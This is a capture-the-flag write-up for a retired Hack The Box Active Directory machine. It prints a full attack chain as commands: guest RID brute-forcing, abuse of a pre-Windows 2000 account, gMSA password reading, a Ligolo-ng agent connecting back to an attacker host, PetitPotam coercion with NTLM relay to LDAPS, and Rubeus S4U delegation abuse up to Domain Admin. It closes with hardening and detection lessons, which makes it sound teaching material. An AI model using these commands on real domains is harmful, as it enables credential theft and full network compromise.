---
machine: Pirate
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, s4u2proxy]
---

# Pirate — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A domain split across two segments. Entry is a **Pre-Windows 2000 computer account** whose password is the lowercase machine name (14 chars); from there you read a **gMSA** password, pivot with **Ligolo-ng**, coerce a secondary server with **PetitPotam** and relay that NTLM to **LDAPS** to write **RBCD**. Delegation over the web server plus **SPN jacking + S4U2Proxy** ends at Domain Admin.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389
```

A DC with LDAP, Kerberos, SMB and WinRM. `nxc smb <IP>` returns the domain name; accounts whose `userAccountControl` carries the Pre-Windows 2000 flag are the entry point.

## Initial access

```bash
nxc smb <DC> -u 'guest' -p '' --rid-brute 3000
```

Host accounts `LEGACY01$` and `MS01$` show up. The legacy password is the lowercase hostname truncated to 14 characters:

```bash
impacket-getTGT '<domain>/MS01$:ms01' -dc-ip <DC>
export KRB5CCNAME=ms01\$.ccache
```

That TGT can read the **gMSA** password, because the Pre-Windows 2000 group holds the read ACE:

```bash
nxc ldap <DC> -k --use-kcache --gmsa
```

It returns the service account NT hash, which already opens WinRM on the middle host.

## Pivot into the second segment

```bash
# attacker
ip tuntap add user $USER mode tun ligolo && ip link set ligolo up
./proxy -selfcert

# on the compromised host
./agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
# in the proxy: session -> start, then add the second segment route
```

```bash
nmap -p- 172.16.7.0/24
```

## RBCD through NTLM relay to LDAPS

From the middle host, coerce the web server:

```bash
python3 PetitPotam.py -u <user> -p <pass> -d <domain> <LISTENER_IP> <WEB_IP>
```

```bash
ntlmrelayx.py -t ldaps://<DC> --delegate-access --escalate-user 'MS01$'
```

The relay writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on the web host, so `MS01$` may delegate to it. Request a service ticket as Administrator:

```bash
impacket-getST -spn cifs/<WEB> -impersonate Administrator -dc-ip <DC> '<domain>/MS01$:<hash>'
export KRB5CCNAME=Administrator@cifs_web.ccache
```

## Final hop with SPN jacking

The same control over the account lets you write your own SPN and abuse `altservice`:

```bash
Rubeus.exe s4u /user:MS01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<WEB> /altservice:ldap /ptt
```

Copying the delegation onto the DC's `ldap`/`cifs` service reaches Domain Admin, and both flags are under `C:\Users\Administrator\Desktop\`.

## Lessons

- Machine accounts with name-derived passwords still exist in old domains: hunt them and rotate them.
- Reading a gMSA is effectively reading service credentials; the ACE belongs only on the host that uses it.
- Coercion plus LDAPS relay still works when signing and channel binding are not enforced.
- `WriteSPN` on an account that can delegate is full domain compromise: audit who may write `servicePrincipalName`.
- Detection: outbound 445 from servers, anomalous NTLM auths to the DC, and creation of `msDS-AllowedToActOnBehalfOfOtherIdentity` objects.
